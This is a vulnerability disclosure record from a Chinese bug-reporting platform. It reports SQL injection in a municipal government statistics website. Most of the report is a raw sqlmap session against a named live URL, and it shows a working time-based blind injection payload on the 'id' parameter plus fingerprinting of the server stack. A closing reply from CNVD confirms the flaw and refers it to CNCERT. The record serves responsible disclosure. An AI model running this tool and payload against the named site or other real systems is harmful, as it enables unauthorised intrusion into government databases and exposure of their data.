wybug_title: 某市信息管理网存在注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-03-31：	细节已通知厂商并且等待厂商处理中									2015-04-03：	厂商已经确认，细节仅向厂商公开									2015-04-13：	细节向核心白帽子及相关领域专家公开									2015-04-23：	细节向普通白帽子公开									2015-05-03：	细节向实习白帽子公开									2015-05-18：	细节向公众公开  简要描述： 可能导致大量信息外露 详细说明：  

注入地址：http://www.dystats.gov.cn/view.php?id=1112
C:\Python27\sqlmap>sqlmap.py -u http://www.dystats.gov.cn/view.php?id=1112         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150301}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. This can take a couple of seconds[17:10:15] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'and provide a string or regular expression to match onhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c[17:10:17] [INFO] testing if GET parameter 'id' is dynamicsqlmap got a 302 redirect to 'http://www.dystats.gov.cn:80/index.php'. Do you want to follow? [Y/n] n[17:10:21] [INFO] confirming that GET parameter 'id' is dynamic[17:10:22] [WARNING] GET parameter 'id' does not appear dynamic[17:10:22] [INFO] heuristics detected web page charset 'ascii'[17:10:22] [WARNING] heuristic (basic) test shows that GET parameter 'id' mightnot be injectable[17:10:22] [INFO] testing for SQL injection on GET parameter 'id'[17:10:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:10:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:10:23] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:10:23] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:10:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:10:24] [INFO] testing 'MySQL inline queries'[17:10:24] [INFO] testing 'PostgreSQL inline queries'[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:10:24] [INFO] testing 'Oracle inline queries'[17:10:24] [INFO] testing 'SQLite inline queries'[17:10:24] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:10:24] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[17:10:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:10:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:10:25] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (SELECT)'[17:10:36] [INFO] GET parameter 'id' seems to be 'MySQL > 5.0.11 AND time-basedblind (SELECT)' injectable[17:10:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[17:10:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[17:10:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[17:10:38] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 113 HTTP(s) requests:---Parameter: id (GET)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: id=1112 AND (SELECT * FROM (SELECT(SLEEP(5)))lLdY)---[17:11:15] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.1back-end DBMS: MySQL 5.0.11[17:11:15] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.dystats.gov.cn'

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-04-03 18:16 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给相应分中心，由其后续协调网站管理单位处置 . 最新状态： 暂无
